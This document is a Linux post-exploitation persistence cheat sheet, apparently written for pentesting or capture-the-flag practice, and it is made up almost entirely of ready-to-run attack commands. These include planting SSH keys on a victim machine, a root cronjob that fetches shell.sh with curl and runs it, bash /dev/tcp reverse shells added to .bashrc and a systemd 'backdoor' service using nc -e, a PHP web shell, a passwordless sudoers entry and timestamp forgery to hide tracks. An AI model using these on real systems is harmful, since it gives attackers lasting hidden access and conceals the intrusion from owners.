--------------------------------------------------
SSH access
--------------------------------------------------

### tool for SSH backdoor
```bash
git clone https://github.com/NinjaJc01/ssh-backdoor
```
### manually add SSH access
```bash
# locally, generate public key
ssh-keygen 
# copy the file from local to victim
scp ~/.ssh/id_rsa.pub remote-user@$IP:~/.ssh/
# on victim machine, add the key to authorized_keys 
cat ~/.ssh/id_rsa.pub >> authorized_keys
# locally, set the file permissions
chmod 600 ~/.ssh/authorized_keys
# SSH in
ssh -i ~/.ssh/id_rsa remote-user@$IP # -o PubkeyAcceptedKeyTypes=rsa-sha2-256 
```

<br>

--------------------------------------------------
Cronjob
--------------------------------------------------

### create cronjob in `/etc/crontab`
```bash
echo "* *     * * *   root    curl http://10.10.10.109:80/shell.sh | bash &" >> /etc/crontab
```
### shell.sh local file 
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.109/443 0>&1
```

<br>

--------------------------------------------------
.bashrc
--------------------------------------------------

### Get a reverse shell when a session is started
```bash
echo 'bash -i >& /dev/tcp/10.10.10.109/443 0>&1' >> ~/.bashrc
```

<br>

--------------------------------------------------
Linux-PAM (Pluggable Authentication Modules)
--------------------------------------------------

### download script and follow the steps
```bash
git clone https://github.com/zephrax/linux-pam-backdoor
```

<br>

--------------------------------------------------
PHP backdoor in web app
--------------------------------------------------

### leave a PHP backdoor in `/var/www/html`
```php
<?php
    if (isset($_REQUEST['chronos_cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['chronos_cmd']) . "</pre>";
    }
?>
```

<br>

--------------------------------------------------
Create backdoor service
--------------------------------------------------

### create and enable service
```bash
nano ~/.config/systemd/user/backdoor.service
```
```
[Unit]
Description=Very important backdoor.[Service]
Type=simple
ExecStart=/usr/bin/nc -e /bin/bash 10.10.10.109 443 2>/dev/null
[Install]
WantedBy=default.target
```
```bash
systemctl --user enable backdoor
```

<br>

--------------------------------------------------
Add user to sudoers
--------------------------------------------------

### modify /etc/sudoers
```bash
echo 'username        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers
```

<br>

--------------------------------------------------
Change file timestamps
--------------------------------------------------

### hide time creation or modification
```bash
touch -t YYYYMMDDhhmm filename
```
